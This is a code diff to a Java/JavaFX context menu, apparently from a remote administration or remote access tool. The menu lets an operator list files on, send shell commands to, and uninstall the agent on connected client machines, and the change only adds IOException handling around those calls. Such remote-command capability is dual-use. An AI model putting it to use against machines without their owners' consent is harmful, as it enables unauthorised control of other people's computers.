@@ -29,7 +29,11 @@ class IPContextMenu implements Repository {
         MenuItem sb1 = new MenuItem("File Explorer");
         sb1.setOnAction(event -> {
             if (clientObject != null && clientObject.getClient().isConnected() && clientObject.getOnlineStatus().equals("Online")) {
-                clientObject.clientCommunicate("FILELIST");
+                try {
+                    clientObject.clientCommunicate("FILELIST");
+                } catch (IOException e1) {
+                    e1.printStackTrace();
+                }
             }
         });
         MenuItem sb2 = new MenuItem("Send Command");
@@ -43,7 +47,11 @@ class IPContextMenu implements Repository {
             stage.show();
             SendCommandView.getsendCommandButton().setOnAction(a -> {
                 if (clientObject != null && clientObject.getClient().isConnected() && clientObject.getOnlineStatus().equals("Online")) {
-                    clientObject.clientCommunicate("CMD " + SendCommandView.getTextField().getText());
+                    try {
+                        clientObject.clientCommunicate("CMD " + SendCommandView.getTextField().getText());
+                    } catch (IOException e1) {
+                        e1.printStackTrace();
+                    }
                 }
             });
         });
@@ -58,7 +66,11 @@ class IPContextMenu implements Repository {
         MenuItem mi3 = new MenuItem("Uninstall Server");
         mi3.setOnAction(event -> {
                 if (clientObject != null && clientObject.getClient().isConnected() && clientObject.getOnlineStatus().equals("Online")) {
-                    clientObject.clientCommunicate("EXIT");
+                    try {
+                        clientObject.clientCommunicate("EXIT");
+                    } catch (IOException e1) {
+                        e1.printStackTrace();
+                    }
                 }
                 PseudoBase.getMausData().remove(clientObject.getIP());
                 CONNECTIONS.remove(clientObject.getIP());
